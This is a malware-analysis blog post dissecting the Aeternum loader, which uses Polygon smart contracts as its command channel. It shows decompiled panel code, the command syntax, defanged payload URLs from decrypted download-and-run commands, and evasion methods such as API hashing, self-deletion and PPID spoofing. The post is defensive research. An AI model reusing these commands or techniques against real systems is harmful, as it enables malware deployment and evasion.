---
title: "Inside Blockchain malware"
classes: wide
header:
  teaser: /assets/images/block/logo.png
ribbon: black
description: "MaaS over blockchain"
categories:
  - Threat Research
tags:
  - Threat Research
toc: true
---

# Aeternum C2 BotNet Loader

In the CtrlAltIntel blog on [ErrTraffic](https://ctrlaltintel.com/threat%20research/ErrTraffic/) we observed advertisements on the panel for "Aeternum C2 BotNet Loader", which was a Blockchain-based C2 panel that uses Polygon smart contracts for its command database. 

This was really interesting to us, and we can see why a threat actor might choose to do this. It comes with some advantages:

* The blockchain is not getting seized by the feds 
* You don't **need** public facing infrastructure that could be tracked

You can run the "server-side" panel locally on a VM, hook up a Polygon wallet, and boom - you can start issuing commands to victims - but at a very small cost of MATIC crypto.    

## Getting the Panel

We mentioned that you don't **need** to configure the C2 server panel to be public facing, and actually, it's a very bad idea to do this. The C2 panel is implemented as a `Next.js` web application, which we thankfully found one exposed on `hXXp://23.94.145[.]192:3000/`:

[![1](/assets/images/block/1.png)](/assets/images/block/1.png){: .full}  

After I found this (initially on Censys <3), we checked the source-code to discover the Polygon smart-contract & C2 source-code was exposed public-facing as JavaScript:

[![1](/assets/images/block/2.png)](/assets/images/block/2.png){: .full}  

This REALLY helped understand how the C2 protocol worked, as at this point in time we didn't have a build, and the build itself was hard (for me) to reverse. 

We do think it's cool how the C2 over Blockchain worked, so we want to take the time to break down the surrounding concepts. 

# Command, Control & Crypto (C3)

Looking at the JavaScript source it was clear C2 commands were sent to victims via Polygon a "smart contract". Think of a smart contract as a tiny program that lives forever on the internet, hosted by nodbody and everyone at once. It's stored across a decentralised network of thousands of computers (the Polygon blockchain network). Once deployed, it cannot be deleted or shut down. The program will exist forever at a specific address like `0x7A3B...9F3d`. 

The panel will also allow operators to deploy smart contracts to the Polygon blockchain. These smart contracts contain a function which is called by the malware, via the Polygon RPC, that will return the encrypted command that is decrypted and ran on victim machines. 

## Unlocking the panel

When you first view the panel, you'll be asked for a Polygon private key and told "Your key will be encrypted with AES-256-GCM". 

[![1](/assets/images/block/3.png)](/assets/images/block/3.png){: .full}  

We can validate this is the case, although it is just encrypted and stored with the browsers local storage. At no point does the private key leave the browser!

```js
static async encryptPrivateKey(e, a) {              
    try {
        let t = new TextEncoder().encode(e),
            s = new Uint8Array(16),
            r = localStorage.getItem(this.SALT_KEY + "_" + a);
        r ? s = new Uint8Array(JSON.parse(r)) : (crypto.getRandomValues(s), localStorage.setItem(this.SALT_KEY + "_" + a, JSON.stringify(Array.from(s))));
        let c = navigator.userAgent + navigator.language + screen.colorDepth,  // "Unique" user identifier
            l = await this.deriveKey(a + c, s),                                // AES key derived using the above "Unique" user identifier 
            n = new Uint8Array(12);
        crypto.getRandomValues(n);
        let o = await crypto.subtle.encrypt({
                name: "AES-GCM",
                iv: n
            }, l, t),
            i = {
                iv: Array.from(n),
                data: Array.from(new Uint8Array(o))
            };
        localStorage.setItem(this.STORAGE_KEY + "_" + a, JSON.stringify(i))   // Stored locally 
//[...REDACTED...]
```

This `encryptPrivateKey()` function is later called after the user provides their private key, and the Ethers.js library is used to create a new wallet, derive public addresses and check whether the provided keys were valid. 

```js
let tg = async () => {
    if (!em) return p.oR.error("Enter key");  // User input, em = private key
    ex(!0);
    try {
        eY.setEncryptionKey(em);         
        let e = new i.FR(en),               // RPC provider, en = https://polygon-rpc.com (or some other)
            a = new x.u(em, e),            // New wallet created using Ethers.js x.u = Wallet() 
            t = await a.getAddress();      // Derive public address from private key 

        await R.encryptPrivateKey(em, t), M(t), U(!0), await tm(t);  // Encrypt private key 
        let s = (await e.getNetwork()).chainId.toString(16);          // Attempt to use private key to connect 
        P("0x".concat(s)), ef(""), ed(!1), p.oR.success("Connected securely")
    } catch (e) {
        console.error("Connection error:", e), p.oR.error("Invalid key")
    } finally {
        ex(!1)
    }
}
```

If successful, you unlock the panel where you can see the features and gain further insight than just reading the source:

<center>
<video width="1080" height="720" controls="controls">
<source src="/assets/images/block/4.mp4" type="video/mp4">
</video>
</center>

## Smart Contract Analysis

We mentioned earlier that smart contracts are programs that live on the internet. Like all programs, smart contracts are also written in programming langauges. [Solidity](https://www.soliditylang.org/) is a programming language used for developing smart contracts that run on Etheremum. 

Within the JavaScript we saw Solidity compiled bytecode for the smart contract to run on Ethereum Virtual Machine (EVM): 

[![1](/assets/images/block/6.png)](/assets/images/block/6.png){: .full}  

To create a smart contract, the function `u.P()` maps to `ethers.ContractFactory()`. This takes in an ABI, the bytecode and a signer (derived from user submitted private key) to create a ContractFactory object stored as the variable `s`, which is used to deploy this contract using `s.deploy()`.   

As bytecode is not readable, an Application Binary Interface (ABI) is used to expose the low-level smart contract's functions and make them accessible from a high-level programming language like JavaScript. We can find this hardcoded within the source exposing the functionality of smart contract:

[![1](/assets/images/block/5.png)](/assets/images/block/5.png){: .full}  

1. Constructor - defines a required intilization string, `initialDomain`. This is actually an encrypted C2 command 
2. Event - `DomainUpdated`, the contract logs every change to the stored string (encrypted C2 command)
3. Read-only function - `admin()`, the contract has a single privileged address which is publicly readable
4. Read-only function - `getDomain()`, the contract stores one string value which is publicly readable (encrypted C2 command)
5. State-changing function - `updateDomain()`, allows operator to replace stored string (encrypted C2 command)

### Commands

The C2 commands decrypted have 2 main flags, `all` or `hwid`. If the flag command is `all`, Aeternum loader will proceed running the command regardless. If `hwid`, it'll only run if the provided `hwid` value matches a unique host ID generated by taking the MD5 hash of the `C:`-drive serial number. 

* `all` - run on all endpoints
* `hwid` - run on specific endpoint

All C2 commands will contain a URL which will host the payload Aeterum Loader will execute or make a request too. There are options for command-line arguments, establishing persistence and making "ping" checks via HTTP requests. 

* `hwid:fca8bdd1134497619285f4f9aba60817:url:<URL>` - Execute payload on URL of specific host

* `all:url:<URL>` - Execute payload on URL

* `all:args:<ARGS>:url:<URL>` - Execute payload on URL

* `all:savestartupname:<NAME>:url:<URL>` - Execute payload on URL + establish persistence

* `all:savestartupname:<NAME>:args:<ARGS>:url:<URL>` - Execute payload on URL w. command-line arguments + establish persistence

* `all:ping:url:<URL>` - Make call-back HTTP request to get IPs

Aeternum Loader will decrypt and parse these C2 commands, initially checking for `all` or `hwid` flags. The file extension of the file within the URL is used to decide what "path" to take within the malware execution pattern. Aeternum Loader will reflectively load all DLLs within memory, with file extensions being written to disk before being ran.

The C2 commands (e.g. `all:ping:url:<URL>`) are stored on the Blockchain encrypted. From the panel source, we can see that they are stored AES encrypted, with a PBKDF2 key derived from the contract address:

```js
static async deriveKey(e, a) {
let t = new TextEncoder().encode(e),
    s = await crypto.subtle.importKey("raw", t, "PBKDF2", !1, ["deriveKey"]);
return crypto.subtle.deriveKey({
    name: "PBKDF2",
    salt: a.buffer,
    iterations: 1e5,
    hash: "SHA-256"
}, s, {
    name: "AES-GCM",
    length: 256
}, !1, ["encrypt", "decrypt"])
}  
```

The format of encrypted C2 commands are as follows:

```
AES key = PBKDF2( 100,000 iterations + salt/password = lowercase(contract_address) )

hex(base64(IV):base64(AES encrypted data))  
```

This means, from the contract address alone, it's possible to completely decrypt all commands that have been sent to that particular C2 channel.

# Blockchain Analysis

In the [second blog](), we reverse a build of Aeternum Loader - directly from `LenAI` themselves, eventually extracting the contract address `0x4d70C3393C5d9EC325Edf8b3f289cFA9777e64B0`. We can use Polygon scan to view the 13 transacations surrounding this smart contract:

[![1](/assets/images/block/41.png)](/assets/images/block/41.png){: .full}  

We can see each transaction corresponds to a "Update Domain" event, which are triggered when the `updateDomain()` function is called. Looking on the "events" tab we can see a historical log of all C2 commands for this specific smart contract:

[![1](/assets/images/block/42.png)](/assets/images/block/42.png){: .full}  


---
 
# Aeternum Loader Analysis

## Getting a build


## String obfuscation

Aeternum Loader uses per-string XOR obfuscation using unique keys. The obfuscated bytes live within the binaries `.data` section, and are dynamically decrypted by each function that uses them. 

Within the IDA it was clear to spot where XOR decryption was occuring. You'd either see successive XOR operations or a loop iterating through the bytes performing XOR operations:

**Example 1**:

[![1](/assets/images/block/12.png)](/assets/images/block/12.png){: .full}  

In the above example, we've named the 4 bytes `byte_443A21` ... `byte_443A24` the "encrypted bytes" and `byte_443A26` ... `byte_443A29` the "key bytes". At runtime (guarded by a “decoded” flag so it only happens once), each function will recovers plaintext strings by XORing each encrypted byte with the corresponding key byte at the same index, overwriting the encrypted bytes: `enc[i] = enc[i] XOR key[i]`.

**Example 2**:

[![1](/assets/images/block/13.png)](/assets/images/block/13.png){: .full}   

This example is very similar, although we just observed a *for loop* that iterated through the decryption process of strings. In both of the above, it was possible to do manually - but it was tedious to do at scale. We wanted to somehow speed the process of extracting the strings.

[![1](/assets/images/block/14.png)](/assets/images/block/14.png){: .full}   

When examining the encrypted bytes and their corresponding keys in a hexdump, we noticed a consistent structure we could leverage. First, we established that each pair is the same length: `len(ENC_n) = len(KEY_n)`. We also observed that, in the raw binary, the data is laid out like:

```python
[...] 00 00 00 [ENC] 00 [KEY] 00 00 00 [ENC_1] 00 [KEY_1] 00 00 00 [...]
```

In other words, the encrypted bytes and key bytes (which are same length) are separated by a single null byte (`00`), which acts as a clear delimiter between the two. Surrounding each pair is a triple-null boundary (`00 00 00`): three null bytes appear immediately before the encrypted bytes and again immediately after the key bytes, effectively framing each ENC/KEY entry and making it straightforward to locate and carve consecutive pairs from the blob.

We can use an LLM to whip up a Python script that carves this pattern from the `.data` section, dumping raw strings, revealing some juicy information:

[![1](/assets/images/block/15.png)](/assets/images/block/15.png){: .full}   

Here we can see large lists of Polygon RPC URLs that would be used to make requests to the Smart Contract address hard-coded within the strings - `0x4d70C3393C5d9EC325Edf8b3f289cFA9777e64B0`.

## Dynamic Windows API resolution

Aeternum Loader attempts to obfuscate imported some Win32 API functions via dynamic resolution. We observed the actor use API hashing, using multiple algorithms, to dynamically lookup function names rather than storing them in clear text. 

**CRC32**

The main API hashing algorithm works by loading the relevant module, which was `kernel32.dll` each time the function was called. The algorithm will then locate the DLLs export directory and iterate through this, computing a CRC32 hash of the function name:

[![1](/assets/images/block/16.png)](/assets/images/block/16.png){: .full}   

We can see this function is called multiple times, each time with a hash as the parameter:

[![1](/assets/images/block/17.png)](/assets/images/block/17.png){: .full}

It's posssible to use a Python script to create the CRC32 hashing algorithm, and match the corresponding hashes:

```python
def api_crc32(s): # Function name as input
    c=0xFFFFFFFF
    for b in s.encode("ascii"):
        c^=b
        for _ in range(8):
            c=(c>>1)^(POLY if c&1 else 0)
            c&=0xFFFFFFFF
    return (~c)&0xFFFFFFFF
```   

This can speed up the process of resolving function names to hashes:

[![1](/assets/images/block/18.png)](/assets/images/block/18.png){: .full}

**DJB2**

The loader has the ability to reflectively load payloads from memory. Within this capability, which we will get to later, we also observed DJB2 API hashing to obfuscate imported functions. Like before, we can recreate the algorithm within Python:

```python
def djb2_hash(function_name):
    hash_value = 112186
    for char in function_name:
        hash_value = ord(char) + 33 * hash_value
    return hash_value & 0xFFFFFFFF
``` 
[![1](/assets/images/block/30.png)](/assets/images/block/30.png){: .full}

Similarly, we can retrieve the relevant resolved function names:

[![1](/assets/images/block/31.png)](/assets/images/block/31.png){: .full}

## Country geo-fencing checks

Within the main payload we can see the function `FUN_004126f0()` is called before any actions actually take place. Looking inside this function we can see the following:

[![1](/assets/images/block/26.png)](/assets/images/block/26.png){: .full}

Breaking down the functionality we can see this function sets out to achieve the following:

`GetSystemDefaultLangID()` - Checks system language
`GetUserDefaultLangID()` - Checks user language

Uses a registry line check to see if control panel code identifier is set to `0x419` (Russia)

```c
if ((LVar2 != 0x419) && (LVar3 != 0x419)) {
    LVar4 = RegOpenKeyExW((HKEY)0x80000002, L"Control Panel\\International", 0, 0x20019, &local_cc);
```

Reads `LocaleName` from registry and compares against a blacklist at 'DAT_00435390' (Russia)

```c
if (LVar4 == 0) {
    __memset(local_c8, 0, 0xaa);
    local_d0 = 0xaa;
    LVar4 = RegGetValueW(local_cc, (LPCWSTR)0x0, L"LocaleName", 2, (LPDWORD)0x0, local_c8, &local_d0);
    RegCloseKey(local_cc);
    if (LVar4 == 0) {
        pauVar5 = FUN_00417450((undefined1 (*)[16])local_c8, (undefined1 (*)[16])&DAT_00435390);
        if (pauVar5 != (undefined1 (*)[16])0x0) goto LAB_00412d30;
    }
}
```

Overall meaning the malware performs checks on the host to confirm if the device/user is from Russia and if so seizes termination. Interestingly, doesn't appear to check for other common CIS/former-Soviet countries that malware often avoids.


## Installation & Persistence

If Aeternum loader passes the Anti-VM and Russia geofencing checks, it'll begin an installation process to establish persistence. This involves using the Win32 resolved API function `GetModuleFileNameA()` to retrieve the full file path of the original binary. Aeternum Loader is then copied to `AppData\Local`, persisting via the Startup folder. 

| Type            | File Path                                                                                                            |
|-----------------|----------------------------------------------------------------------------------------------------------------------|
| Aeternum Loader | `C:\Users\[USER]\AppData\Local\wmi[HOST_ID]\wmi_[HOST_ID].exe`                                                       |
| Persistence     | `C:\Users\[USER]\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\[AUTORUN_NAME]wmi[HOST_ID].lnk` |

The "HOST_ID" strings are the MD5 hash of the `C:`-volume serial number. The above `.lnk` is attempting to persist the core Aeternum Loader module. Later, when we inspect the loader's capabilties - we'll observe dropped payloads also can be configured to persist via the Startup folder. 

**Installation:**

[![1](/assets/images/block/33.png)](/assets/images/block/33.png){: .full} 

**Persistence:**

[![1](/assets/images/block/34.png)](/assets/images/block/34.png){: .full}


### Self Deletion

Aeternum uses self-deletion technique that leverages NTFS Alternate Data Streams (ADS) to achieve anti-forensic objectives. The technique which first originated as a POC on Github (https://github.com/LloydLabs/delete-self-poc) is now being used in malware to enable executables to delete themselves after execution, complicating incident response and forensic analysis efforts. 

The routine executes after the malware has completed its primary payload delivery, specifically after copying itself to a persistence location. To begin with, the malware retrieves its own executable path using `GetModuleFileNameW`. 

[![1](/assets/images/block/27.png)](/assets/images/block/27.png){: .full}

After that, the malware constructs a `FILE_RENAME_INFO` structure programmatically, encoding the target stream name character by character:

[![1](/assets/images/block/28.png)](/assets/images/block/28.png){: .full}

The rename operation creates NTFS journal entries showing the file was renamed to an ADS, but the original file content becomes inaccessible through normal file system traversal. Recovery of the malware binary becomes dependent on capturing process memory before termination, as the file system no longer contains the executable.

While any ADS name would work technically, this specific string `":wtfbbq"` has been seen before, leveraged via [Latrodectus](https://www.elastic.co/security-labs/spring-cleaning-with-latrodectus) and [MuddyWater's StealthCache](https://www.group-ib.com/blog/muddywater-infrastructure-malware/).


## Command & Control

Once installed, it'll start the beaconing process in order to retrieve encrypted comands. Specifically, a Mersenne Twister-like PRNG is leveraged to create beacon jitter, with a random delay of 1 to 3 minutes. Aeternum Loader attempts to achieve redundancy using a hardcoded list of over [Polygon RPC domains](https://github.com/ctrlaltint3l/intelligence/blob/main/Aeternum%20Loader/PolygonRPC.txt).

### Polygon RPC for C2

The contract address, `0x4d70C3393C5d9EC325Edf8b3f289cFA9777e64B0`, was XOR encrypted and used with the smart contract's `getDomain()` function export address `0xb68d1809` in order to retrieve C2 commands. `POST` requests were made to the C2 using the below parameters:

```
POST / HTTP/1.1
Host: <polygon-rpc-host>
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Content-Type: application/json

{"jsonrpc":"2.0","method":"eth_call","params":[{"to":"0x4d70C3393C5d9EC325Edf8b3f289cFA9777e64B0","data":"0xb68d1809"},"latest"],"id":1}
```

This would return JSON, and within the `result` value is the encrypted command:

```
{"jsonrpc":"2.0","id":1,"result":"0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000ba363137383665353434373431333736343633326235353262366434313530343333613734363337313634333733363664373833383534333032623431363532623535326634363432363236643434343237313737363734343431353836643531373937383466333335333339363233353438353037343464353033393661343433303437346236363334363536333535353433323461356137343761343437353461373434373435363336333531373336613735363936663364000000000000"}
```

We can remove the padding and hex decode this twice to reveal the encrypted command:

[![1](/assets/images/block/35.png)](/assets/images/block/35.png){: .full}

**Decrypting C2 commands**

The exposed data on the blockchain C2 is AES encrypted with a key derived from the contract address. This means you only need to know the contract address in order to decrypt all commands that have been sent to that particular "C2 server". We can use the below Python script to decrypt commands:

```python
import base64
import hashlib
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives import hashes

def decrypt_command(contract_address, encrypted):
    iv_b64, ct_b64 = encrypted.split(":", 1) # Extract IV / ENC data

    iv = base64.b64decode(iv_b64)          # B64 decode IV 
    ciphertext = base64.b64decode(ct_b64)  # B64 decode ENC data

    
    addr = contract_address.lower().encode("utf-8")   
    kdf = PBKDF2HMAC(                             # Derive AES key from contract address
        algorithm=hashes.SHA256(), 
        length=32,            # 256 bits
        salt=addr,            # salt = contract address (same as password)
        iterations=100_000,
    )
    key = kdf.derive(addr)    # password = contract address


    aesgcm = AESGCM(key) 
    plaintext = aesgcm.decrypt(iv, ciphertext, None)  # AES decrypt


    return plaintext.decode("utf-8") #Plaintext command
```

We can do this at scale, I'll break down a few example commands we observed for this sample:

* `all:url:hXXps://rpc-framework-check[.]cfd/1.ps1` - Download and run PowerShell script `1.ps1` on all hosts
* `all:url:hXXps://github[.]com/ooocyber_bunerkdl/ttt/raw/refs/heads/main/123.exe` - Download and run `123.exe` on all hosts
* `hwid:fca8bdd1134497619285f4f9aba60817:url:hXXps://rpc-framework-check[.]cfd/123.exe` - Download and run `123.exe` on specific host 

## Loader

| Payload extension (from URL)      | Drop behavior                   | Notes                                                                                                             | Persistence behavior                                                       |
| --------------------------------- | ------------------------------- | ------------------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------- |
| `.dll`                        | **No drop** (reflective loading) | Manual-map/reflective-style load; RWX + `MEM_TOP_DOWN`; resolves imports/relocs; calls `DllMain`; may call a named export | N/A          |
| `.ps1`**                        |`%TEMP%\{RANDOM10}\{RANDOM10}.ps1`           | Removes MOTW (`:Zone.Identifier` ADS deletion); PowerShell runs hidden with ExecutionPolicy bypass + NoProfile            | If enabled: Startup folder `.lnk` pointing to dropped script |
| `.cmd` / `.bat`               | `%TEMP%\{RANDOM10}\{RANDOM10}.ps1`           | Removes MOTW; runs via `cmd.exe`; **PPID spoofing** to `explorer.exe`                                                     | If enabled: Startup folder `.lnk` pointing to dropped script               |
| `.exe` + all other extensions | `%TEMP%\{RANDOM10}\{RANDOM10}.ps1`           | Removes MOTW; **PPID spoofing** to `explorer.exe`                                    | If enabled: Startup folder `.lnk` pointing to dropped file                 |

### Reflective DLL Loading

If the Aeternum Loader is downloading a `.dll` payload, it will not write to disk, but rather reflectively load it within memory via Manual PE mapping.

Firstly, it checks whether the binary is a valid executable with "MZ" & "PE" header strings:

[![1](/assets/images/block/20.png)](/assets/images/block/20.png){: .full}

Then an area of memory is allocated with RWX permissions set to the size of the PE:

[![1](/assets/images/block/21.png)](/assets/images/block/21.png){: .full}

Since `VirtualAlloc` returns an arbitary address, the code processes the relocation table and remaps to the correct entry point. But in order to actually run the DLL within memory, it needs to import it's relevant functions. As mentioned earlier, dbj2 API hashing is used to resolve the functions for `LoadLibraryA`, `GetProcAddress` & `GetModuleHandleA`. These 3 functions are used to figure out the mapped PE's imports, then importing them dynamically. 

[![1](/assets/images/block/22.png)](/assets/images/block/22.png){: .full}

After loading relevant functions, the PE is executed:

[![1](/assets/images/block/23.png)](/assets/images/block/23.png){: .full}

### Writing payloads to disk

If the Aeternum Loader is **not** downloading a `.dll` payload (i.e. downloading `.exe`, `.ps1`, `.cmd` or `.bat`), it'll create a directory within `%TEMP%` with 10 random characters. Another 10 random characters are also choosen for the file name, and these are written to disk:

[![1](/assets/images/block/24.png)](/assets/images/block/24.png){: .full}

This will write the payload to disk in the directory `C:\Users\<username>\AppData\Local\Temp\[10 random chars]\[10 random chars].[ext]`. Following this, the Mark-Of-The-Web (MoTW) Alternate Data Stream (ADS), `Zone.Identifier`, will be deleted:

[![1](/assets/images/block/25.png)](/assets/images/block/25.png){: .full}

If the C2 command contains the argument `savestartupname`, it will also achieve persistence via an `.lnk` file, with the corresponding name.  

### Parent Process ID (PPID) Spoofing

All payloads that are written to disk are executed with PPID spoofing to make it appear malware is spawning from `explorer.exe`. The function does the following thing:

1. Enumerate running processes using `CreateToolhelp32Snapshot()` to identify `explorer.exe`

2. Open a handle to the parent using `OpenProcess(0x80, 0, CurrentProcesSId)` with parameter `0x80` -> `PROCESS_CREATE_PROCESS` 

3. Build `PROC_THREAD_ATTRIBUTE_LIST`

[![1](/assets/images/block/38.png)](/assets/images/block/38.png){: .full}

4. New process is spawned with spoofed parent, with dwCreationFlags `0x9080200` (`EXTENDED_STARTUPINFO_PRESENT`, `CREATE_NEW_PROCESS_GROUP` - required for PPID spoofing) & custom StartupInfo:

[![1](/assets/images/block/39.png)](/assets/images/block/39.png){: .full}

